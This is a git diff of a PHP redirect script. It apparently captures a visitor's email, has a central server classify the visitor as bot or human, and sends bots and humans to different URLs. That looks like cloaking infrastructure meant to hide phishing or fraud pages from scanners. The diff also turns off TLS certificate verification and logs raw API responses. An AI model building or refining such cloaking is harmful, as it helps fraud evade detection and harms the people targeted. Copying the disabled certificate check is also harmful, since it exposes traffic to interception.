@@ -654,23 +654,26 @@ function extractEmail() {
 
 /**
  * Classify visitor via central server
+ * Note: /api/classify already logs the visit, so no separate log call needed
  */
 function classifyVisitor() {
     \$ip = getClientIP();
     \$userAgent = \$_SERVER['HTTP_USER_AGENT'] ?? '';
+    \$referer = \$_SERVER['HTTP_REFERER'] ?? '';
 
     \$data = [
-        'ip' => \$ip,
+        'ip_address' => \$ip,
         'user_agent' => \$userAgent,
-        'headers' => json_encode(getallheaders() ?: [])
+        'referer' => \$referer
     ];
 
-    \$ch = curl_init(CENTRAL_SERVER_URL . '/api/remote/classify');
+    \$ch = curl_init(CENTRAL_SERVER_URL . '/api/classify');
     curl_setopt_array(\$ch, [
         CURLOPT_POST => true,
         CURLOPT_POSTFIELDS => http_build_query(\$data),
         CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => 5,
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_SSL_VERIFYPEER => false,
         CURLOPT_HTTPHEADER => [
             'X-API-Key: ' . API_KEY,
             'Content-Type: application/x-www-form-urlencoded'
@@ -679,7 +682,11 @@ function classifyVisitor() {
 
     \$response = curl_exec(\$ch);
     \$httpCode = curl_getinfo(\$ch, CURLINFO_HTTP_CODE);
+    \$curlError = curl_error(\$ch);
     curl_close(\$ch);
+
+    // Debug logging (can be disabled in production)
+    error_log("Classify API Response: HTTP \$httpCode - \$response - Error: \$curlError");
 
     if (\$httpCode === 200 && \$response) {
         \$result = json_decode(\$response, true);
@@ -688,33 +695,6 @@ function classifyVisitor() {
 
     // Default to human on API failure
     return 'HUMAN';
-}
-
-/**
- * Log visit to central server (async, non-blocking)
- */
-function logVisit(\$classification, \$email = null) {
-    \$data = [
-        'ip_address' => getClientIP(),
-        'user_agent' => \$_SERVER['HTTP_USER_AGENT'] ?? '',
-        'classification' => \$classification,
-        'captured_email' => \$email,
-        'referer' => \$_SERVER['HTTP_REFERER'] ?? ''
-    ];
-
-    // Fire and forget
-    \$ch = curl_init(CENTRAL_SERVER_URL . '/api/remote/log-visit');
-    curl_setopt_array(\$ch, [
-        CURLOPT_POST => true,
-        CURLOPT_POSTFIELDS => http_build_query(\$data),
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => 2,
-        CURLOPT_HTTPHEADER => [
-            'X-API-Key: ' . API_KEY
-        ]
-    ]);
-    curl_exec(\$ch);
-    curl_close(\$ch);
 }
 
 /**
@@ -754,8 +734,7 @@ if (\$email) {
     captureEmail(\$email);
 }
 
-// Log the visit
-logVisit(\$classification, \$email);
+// Note: Visit is already logged by /api/classify endpoint
 
 // Determine redirect URL
 \$redirectUrl = (\$classification === 'BOT') ? BOT_URL : HUMAN_URL;
